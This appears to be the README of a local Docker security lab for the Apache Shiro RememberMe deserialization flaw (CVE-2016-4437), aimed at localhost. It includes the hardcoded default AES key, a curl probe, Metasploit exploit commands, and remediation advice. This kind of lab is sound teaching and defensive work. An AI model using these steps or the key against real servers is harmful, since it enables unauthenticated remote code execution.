# Apache Shiro RememberMe Default Cipher Insecure Deserialization RCE (CVE-2016-4437)

## Overview

Apache Shiro vulnerability CVE-2016-4437 (often known as Shiro-550) is one of the most widely exploited Java deserialization vulnerabilities in enterprise environments. It stems from the application's **RememberMe** cookie authentication mechanism.

When a user logs into an Apache Shiro application with "Remember Me" checked, Shiro serializes the user identity principal into a byte stream, encrypts it using AES-128 in CBC mode, prepends an initialization vector (IV), Base64-encodes the buffer, and sets it as the `rememberMe` cookie. In versions prior to 1.2.5, Shiro hardcoded a default, static AES key directly inside the source code (`kPH+bIxk5D2deZiIxcaaaA==`). An unauthenticated attacker who knows this default key can craft a malicious serialized Java object (using CommonsCollections gadgets via `ysoserial`), encrypt it using the known AES key, and transmit it as `rememberMe`. When Shiro receives the cookie, it decrypts and deserializes the object, triggering instant Remote Code Execution.

- **Primary Interface**: `http://localhost:8127`
- **Docker Shortcut**: `./lab start shiro-deserialization`
- **Container Name**: `cyberlab_02_shiro_deserialization`
- **RAM Footprint**: ~250 MB

---

## Architecture & Deserialization Flow

```
+-------------------------------------------------------------+
|                Attacker (ysoserial / Python exploit)        |
|  1. Generate gadget payload (CommonsCollections11/CommonsBeanutils)
|  2. Encrypt with AES-CBC using default key:                  |
|     kPH+bIxk5D2deZiIxcaaaA==                                |
|  3. Base64 encode and set: Cookie: rememberMe=ENCRYPTED_PAYLOAD
+-------------------------------------------------------------+
                               |
                        HTTP Port 8127
                               v
+-------------------------------------------------------------+
|               Apache Shiro Framework (vulhub/shiro:1.2.4)   |
|                                                             |
|  1. Extracts 'rememberMe' cookie value                      |
|  2. Decrypts with internal hardcoded AES cipher key         |
|  3. Invokes Java Native ObjectInputStream.readObject()      |
|  4. Deserialization gadget chain triggers command execution |
|                                                             |
|  [Result: Remote OS Command Execution inside JVM]           |
+-------------------------------------------------------------+
```

---

## Exploitation Walkthrough

### 1. Verification of Shiro Exposure

Send a request with an arbitrary `rememberMe=1` cookie. If Shiro is active, it responds with `Set-Cookie: rememberMe=deleteMe`:

```bash
curl -I -s 'http://localhost:8127/login.jsp' -H 'Cookie: rememberMe=1' | grep -i rememberme
```

### 2. Generating & Sending Malicious Payload

Using Python and `ysoserial` (or Metasploit):

```bash
msfconsole -q
use exploit/multi/http/shiro_rememberme_v1_2_4
set RHOSTS 127.0.0.1
set RPORT 8127
set TARGETURI /
exploit
```

---

## Defensive Remediation & Hardening

1. **Upgrade Apache Shiro**:
   Upgrade to Apache Shiro 1.2.5 or newer. Shiro now generates a cryptographically random AES key on application startup.
2. **Explicitly Set Custom Cipher Key**:
   Configure a unique, securely generated 128/256-bit AES key in your Shiro configuration rather than relying on framework defaults.
3. **Migrate to Shiro 1.4+ / Safe Deserialization**:
   Shiro 1.4.2 introduced deserialization object filtering (`ClassFilter`) to block known gadget classes.

---

## Video Walkthroughs & Technical References

- [CVE-2016-4437 shiro-exploit](https://www.youtube.com/watch?v=XJvpC-p4qKM)
- [Apache Shiro SHIRO-550 Advisory](https://issues.apache.org/jira/browse/SHIRO-550)
- [Vulhub Apache Shiro CVE-2016-4437 Advisory](https://vulhub.org/#/environments/shiro/CVE-2016-4437/)
